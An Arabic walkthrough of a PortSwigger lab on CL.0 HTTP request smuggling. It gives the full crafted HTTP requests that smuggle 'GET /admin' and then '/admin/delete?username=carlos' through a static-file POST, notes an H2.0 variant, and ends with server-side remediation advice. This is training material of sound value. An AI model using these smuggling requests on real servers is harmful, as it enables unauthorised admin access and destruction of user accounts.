# [CL.0 request smuggling](https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling)

## **`الهدف`**
قم بتهريب طلب إلى سيرفر الواجهة الخلفية، بحيث يصل إلى لوحة التحكم `/admin` ويحذف حساب `carlos`.
## **`خطوات الحل`**
سنقوم بالبحث عن أي طلب لملف ثابت في `HTTP history` مثل الطلب التالي:
```http
GET /resources/labheader/js/labHeader.js HTTP/2
Host: 0a4100420398338982a0024f00cb00b1.web-security-academy.net
Cookie: session=cDsrj77mJVYwDvKGfsUVtewL12DGl6sG
```
ثم سنقوم بالتالي:
1. تغيير نوع البروتوكول إلى `HTTP/1.1` من داخل `Inspector panel`.
2. تعديل الـ `Method` عن طريق الضغط على الـ `Mouse right-click` ونضغط `Change request method` ليصبح `POST`.
3. تعديل جسم الطلب ليناسب هجوم `CL.0` بالإضافة لوضع الطلب المهرب لمسار `/admin`.

ليصبح شكل الطلب فى النهاية كالتالي: 

```http
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: 0a4100420398338982a0024f00cb00b1.web-security-academy.net
Cookie: session=cDsrj77mJVYwDvKGfsUVtewL12DGl6sG
Content-Length: 33

GET /admin HTTP/1.1
Test1: Test2
```

وسنقوم بإرساله أول مرة وستكون الاستجابة طبيعية ولكن بمجرد إرساله مرة أخرى سنجد أنه أصبح لدينا وصول للوحة التحكم، وبفحص الاستجابة سنجد أنه لحذف حساب `carlos` يجب أن نقوم بإرسال طلب إلى مسار `/admin/delete?username=carlos`
```http
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: 0a4100420398338982a0024f00cb00b1.web-security-academy.net
Cookie: session=cDsrj77mJVYwDvKGfsUVtewL12DGl6sG
Content-Length: 56

GET /admin/delete?username=carlos HTTP/1.1
Test1: Test2
```
وسنقوم بإرساله مرتين متتاليتين ليتم حذف حساب `Carlos` لننتهي من حل اللاب.

**`ملاحظات هامة:`**
1. في المواقع الحقيقة قد تحتاج إلى استعمال ترويسة `Connection: keep-alive` لضمان عدم قطع اتصال الـ `TCP`.
2. هذا اللاب مصاب بثغرة `CL.0` ولكنه كذلك به ثغرة `H2.0` حيث أنه لو أبقينا جميع الطلبات بـ `HTTP/2` ولم نقم بإضافة ترويسة `Content-Length` فسينجح الهجوم كذلك.
## **`ترقيع الثغرة`**
**`نفس ترقيع لاب` [Response queue poisoning via H2.TE request smuggling](./Response-queue-poisoning-via-H2.TE-request-smuggling.md)

ويجب ضبط سيرفر الواجهة الأمامية ليقوم فوراً برفض أي طلب `GET` يحتوي على جسم بـ `400 Bad Request`، وكذلك يقوم برفض أى طلب `POST` موجه لمسارات الموارد الثابثة بـ `405 Method Not Allowed`.

ويجب ضبط سيرفر الواجهة الخلفية لكي لا يتجاهل أبدًأ ترويسة `Content-Length` حتى لو كان لملف ثابت أو `GET` ، ويجب أما أن يقرأ الطلب بالكامل أو يرفضه كليًا لتجنب ترك أى بيانات في اتصال الـ `TCP`.
